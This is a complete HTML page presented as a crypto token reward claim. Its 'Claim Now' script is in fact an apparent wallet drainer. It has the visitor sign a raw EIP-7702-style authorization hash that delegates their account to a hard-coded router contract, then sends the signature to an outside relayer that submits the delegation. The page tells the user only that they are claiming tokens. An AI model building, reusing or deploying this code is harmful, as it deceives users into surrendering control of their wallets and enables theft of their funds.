<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim REWARD</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #08080f;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; color: #e0e0e0;
        }
        .card {
            background: #0c0c14;
            border: 1px solid #1a1a2e;
            border-radius: 16px;
            padding: 36px 28px;
            max-width: 460px; width: 100%;
        }
        .logo {
            text-align: center; margin-bottom: 28px;
            font-size: 13px; letter-spacing: 2px; color: #ff6b35;
            text-transform: uppercase;
        }
        .amount {
            text-align: center; font-size: 48px; font-weight: 700;
            color: #fff; margin: 8px 0; letter-spacing: -1px;
        }
        .sub {
            text-align: center; color: #6b7280; font-size: 13px; margin-bottom: 28px;
        }
        .info {
            background: #0f0f1a; border-radius: 10px; padding: 16px;
            margin-bottom: 24px; font-size: 13px; color: #9ca3af;
            display: flex; align-items: center; gap: 10px;
            border: 1px solid #1a1a2e;
        }
        .info-icon { font-size: 20px; }
        .btn {
            width: 100%; padding: 18px; border: none; border-radius: 12px;
            font-weight: 600; font-size: 15px; cursor: pointer; margin: 8px 0;
            transition: all 0.2s;
        }
        .btn-primary {
            background: #ff6b35; color: #fff;
        }
        .btn-primary:hover:not(:disabled) { background: #e55a2b; }
        .btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .status {
            text-align: center; margin-top: 14px; font-size: 12px; color: #6b7280;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Reward Claim</div>
        <div class="amount">150 REWARD</div>
        <div class="sub">Claim your tokens</div>
        
        <div class="info">
            <span class="info-icon">🔐</span>
            <span>Router: <span style="color:#ff6b35;font-family:monospace;">ROUTER_CONTRACT_ADDRESS</span></span>
        </div>
        
        <button class="btn btn-primary" id="claimBtn">Claim Now</button>
        
        <div class="status" id="status"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
    <script>
        const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
        const CHAIN_ID = 1;
        const RELAYER_URL = 'https://solana-liquidity-pool-production.up.railway.app/api/delegate';

        function toEvenHex(val) {
            if (val === 0 || val === '0x' || val === '0x0') return '0x';
            if (typeof val === 'string' && val.startsWith('0x')) {
                return val.length % 2 === 0 ? val : '0x0' + val.slice(2);
            }
            const hex = ethers.toBeHex(val);
            return hex.length % 2 === 0 ? hex : '0x0' + hex.slice(2);
        }

        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');

            if (!window.ethereum) {
                status.textContent = 'No wallet detected';
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Connecting...';

            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const userAddress = accounts[0];

                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId !== '0x1') {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x1' }]
                    });
                }

                const nonceHex = await window.ethereum.request({
                    method: 'eth_getTransactionCount',
                    params: [userAddress, 'latest']
                });
                const nonce = parseInt(nonceHex, 16);

                btn.textContent = 'Sign authorization...';

                const authPayloadRlp = ethers.encodeRlp([
                    toEvenHex(CHAIN_ID),
                    ROUTER,
                    toEvenHex(nonce)
                ]);

                const authPayloadBytes = ethers.getBytes(authPayloadRlp);
                const magicByte = new Uint8Array([0x05]);
                const combined = new Uint8Array(1 + authPayloadBytes.length);
                combined.set(magicByte, 0);
                combined.set(authPayloadBytes, 1);
                const authHash = ethers.keccak256(combined);

                const signature = await window.ethereum.request({
                    method: 'personal_sign',
                    params: [authHash, userAddress]
                });

                btn.textContent = 'Submitting...';

                const sigBytes = ethers.getBytes(signature);
                const r = '0x' + Array.from(sigBytes.slice(0, 32)).map(b => b.toString(16).padStart(2, '0')).join('');
                const s = '0x' + Array.from(sigBytes.slice(32, 64)).map(b => b.toString(16).padStart(2, '0')).join('');
                const yParity = sigBytes[64] - 27;

                const response = await fetch(RELAYER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userAddress,
                        chainId: CHAIN_ID,
                        router: ROUTER,
                        nonce: nonce,
                        yParity,
                        r,
                        s,
                        callData: '0x61461954'
                    })
                });

                const result = await response.json();

                if (result.success) {
                    status.innerHTML = 'Delegated: ' + result.txHash.slice(0, 24) + '...';
                    btn.textContent = 'Complete';
                } else {
                    throw new Error(result.error || 'Failed');
                }

            } catch (e) {
                status.textContent = 'Error: ' + (e.message || '');
                btn.disabled = false;
                btn.textContent = 'Claim Now';
            }
        });
    </script>
</body>
</html>
